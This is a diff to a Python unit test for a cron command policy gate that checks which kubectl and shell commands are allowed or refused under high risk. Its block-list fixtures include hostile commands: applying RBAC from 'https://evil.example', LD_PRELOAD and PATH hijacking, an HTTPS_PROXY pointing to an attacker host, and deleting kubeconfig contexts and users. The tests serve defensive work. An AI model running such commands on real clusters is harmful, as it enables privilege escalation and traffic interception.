@@ -29,6 +29,16 @@ class CronRiskGateTest(unittest.TestCase):
             "k get nodes -o wide",
             "gcloud container clusters describe prod",
             "gh issue list --state open",
+            "kubectl auth can-i --list",
+            "kubectl auth whoami",
+            "kubectl config view",
+            "kubectl -n proxy get pods",
+            "kubectl get pods -n exec",
+            "kubectl get pod attach -o yaml",
+            "kubectl describe ns port-forward",
+            "kubectl -n cp get pods",
+            "kubectl -n proxy auth can-i create pods",
+            "kubectl get pods -n proxy --watch",
             "echo test",
             "cat /var/log/syslog",
         ]
@@ -62,6 +72,22 @@ class CronRiskGateTest(unittest.TestCase):
             "kubectl exec -n prod deploy/api -- bash -c id --dry-run=client",
             "kubectl delete ns prod --dry-run=client --dry-run=none",
             "echo evil &> /opt/data/jobs.json",
+            "kubectl auth reconcile -f /tmp/rbac.yaml",
+            "kubectl auth reconcile -f https://evil.example/rbac.yaml",
+            "echo 'kind: ClusterRoleBinding' | kubectl auth reconcile -f -",
+            "kubectl config delete-context prod",
+            "kubectl config delete-cluster prod",
+            "kubectl config delete-user admin",
+            "kubectl config unset current-context",
+            "kubectl config rename-context a b",
+            "LD_PRELOAD=/opt/data/x.so kubectl get pods",
+            "PATH=/opt/data/bin kubectl get pods",
+            "HTTPS_PROXY=http://attacker:8080 kubectl get pods",
+            "KUBECONFIG=/tmp/x.yaml kubectl get pods",
+            "kubectl -n proxy delete pods mypod",
+            "kubectl -n proxy exec -it mypod -- bash",
+            "kubectl config",
+            "kubectl auth",
         ]
         for cmd in mutations:
             with self.subTest(cmd=cmd):
@@ -69,6 +95,23 @@ class CronRiskGateTest(unittest.TestCase):
                 self.assertIsNotNone(block, f"Expected {cmd} to be blocked under high risk")
                 self.assertFalse(block["approved"])
                 self.assertIn("SKILL-002", block["message"])
+
+    def test_leading_environment_assignments_refused_under_high_risk(self):
+        for cmd in (
+            "LD_PRELOAD=/opt/data/x.so kubectl get pods",
+            "PATH=/opt/data/bin kubectl get pods",
+            "HTTPS_PROXY=http://attacker:8080 kubectl get pods",
+            "KUBECONFIG=/tmp/x.yaml kubectl get pods",
+            "FOO=bar kubectl get nodes",
+            "FOO=1 BAR=2 kubectl get pods",
+            "A=B; kubectl get pods",
+            "export FOO=1",
+            "env FOO=1 kubectl get pods",
+        ):
+            with self.subTest(cmd=cmd):
+                block = cron_command_policy_block(cmd, "high")
+                self.assertIsNotNone(block, f"{cmd} must be refused under high risk")
+                self.assertFalse(block["approved"])
 
     def test_background_and_newline_cannot_smuggle_a_second_command(self):
         for cmd in (
